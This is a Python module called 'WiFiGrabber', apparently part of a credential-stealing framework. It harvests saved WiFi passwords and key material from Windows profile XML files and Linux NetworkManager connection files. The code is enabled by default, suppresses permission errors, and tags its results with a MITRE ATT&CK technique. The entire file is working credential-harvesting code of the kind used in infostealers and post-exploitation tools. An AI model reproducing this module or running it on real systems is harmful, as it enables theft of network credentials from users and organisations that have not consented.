"""
WiFiGrabber — Extract saved WiFi passwords

Targets:
- Windows: WiFi profile XML files in ProgramData/Microsoft/Wlansvc/Profiles/
- macOS: security find-generic-password (not implemented — requires keychain access)
- Linux: /etc/NetworkManager/system-connections/ (requires root)

Note: On Windows, the XML profiles contain encrypted key material.
Full decryption requires DPAPI (same user context) or the netsh command.
This module extracts profile metadata and, where possible, cleartext passwords.

MITRE ATT&CK: T1005 (Data from Local System)
"""

from __future__ import annotations

import os
import re
from xml.etree import ElementTree

from .base import GrabberContext, GrabberModule
from .models import ExtractedCredential, GrabberResult, GrabberStatus, PrivilegeLevel
from .utils import safe_read_text


class WiFiGrabber(GrabberModule):
    name = "wifi"
    description = "Extract saved WiFi profile information and passwords"
    min_privilege = PrivilegeLevel.USER
    supported_platforms = ("Windows", "Linux")
    default_enabled = True

    _WINDOWS_PROFILES = "{programdata}/Microsoft/Wlansvc/Profiles/Interfaces"
    _LINUX_NM_DIR = "/etc/NetworkManager/system-connections"

    def preflight_check(self, context: GrabberContext) -> bool:
        if context.is_windows:
            path = self._WINDOWS_PROFILES.format(programdata=context.programdata or "")
            return bool(path) and os.path.isdir(path)
        else:
            return os.path.isdir(self._LINUX_NM_DIR)

    def execute(self, context: GrabberContext) -> GrabberResult:
        result = GrabberResult(module_name=self.name)

        if context.is_windows:
            creds = self._extract_windows_profiles(context)
        else:
            creds = self._extract_linux_nm(context)

        result.credentials.extend(creds)
        if creds:
            result.findings.append(self.make_finding(
                file_path=self._WINDOWS_PROFILES if context.is_windows else self._LINUX_NM_DIR,
                description=f"Found {len(creds)} saved WiFi profile(s)",
                score=40 * min(len(creds), 3),
                matched_value="WiFi",
                snippets=[f"SSID: {c.url}" for c in creds[:5]],
            ))

        result.status = GrabberStatus.COMPLETED
        return result

    def _extract_windows_profiles(self, context: GrabberContext) -> list[ExtractedCredential]:
        """Extract WiFi profiles from Windows XML files."""
        creds = []
        base_path = self._WINDOWS_PROFILES.format(programdata=context.programdata or "")
        if not os.path.isdir(base_path):
            return creds

        try:
            # Each interface has its own subdirectory with XML profiles
            for iface_entry in os.scandir(base_path):
                if not iface_entry.is_dir():
                    continue
                for profile_entry in os.scandir(iface_entry.path):
                    if not profile_entry.name.endswith(".xml"):
                        continue

                    content = safe_read_text(profile_entry.path)
                    if not content:
                        continue

                    cred = self._parse_windows_wifi_xml(profile_entry.path, content)
                    if cred:
                        creds.append(cred)
        except (PermissionError, OSError):
            pass

        return creds

    def _parse_windows_wifi_xml(self, path: str, content: str) -> ExtractedCredential | None:
        """Parse a Windows WiFi profile XML for SSID and key material."""
        try:
            # Remove XML namespace for easier parsing
            content = re.sub(r'\sxmlns="[^"]*"', "", content)
            root = ElementTree.fromstring(content)

            ssid = ""
            auth_type = ""
            key_material = ""

            ssid_elem = root.find(".//name")
            if ssid_elem is not None and ssid_elem.text:
                ssid = ssid_elem.text

            auth_elem = root.find(".//authentication")
            if auth_elem is not None and auth_elem.text:
                auth_type = auth_elem.text

            key_elem = root.find(".//keyMaterial")
            if key_elem is not None and key_elem.text:
                key_material = key_elem.text

            if ssid:
                return ExtractedCredential(
                    source_module=self.name,
                    credential_type="password",
                    target_application="WiFi",
                    url=ssid,
                    encrypted_value=key_material.encode() if key_material else b"",
                    notes=f"auth={auth_type}",
                    mitre_technique="T1005",
                )
        except ElementTree.ParseError:
            pass
        return None

    def _extract_linux_nm(self, context: GrabberContext) -> list[ExtractedCredential]:
        """Extract WiFi passwords from NetworkManager connection files (Linux, requires root)."""
        creds = []
        if not os.path.isdir(self._LINUX_NM_DIR):
            return creds

        try:
            for entry in os.scandir(self._LINUX_NM_DIR):
                if not entry.is_file():
                    continue
                content = safe_read_text(entry.path)
                if not content:
                    continue

                # NetworkManager files are INI-like
                ssid = ""
                psk = ""
                for line in content.splitlines():
                    line = line.strip()
                    if line.startswith("ssid="):
                        ssid = line.split("=", 1)[1]
                    elif line.startswith("psk="):
                        psk = line.split("=", 1)[1]

                if ssid:
                    creds.append(ExtractedCredential(
                        source_module=self.name,
                        credential_type="password",
                        target_application="WiFi",
                        url=ssid,
                        decrypted_value=psk,
                        mitre_technique="T1005",
                    ))
        except (PermissionError, OSError):
            pass

        return creds
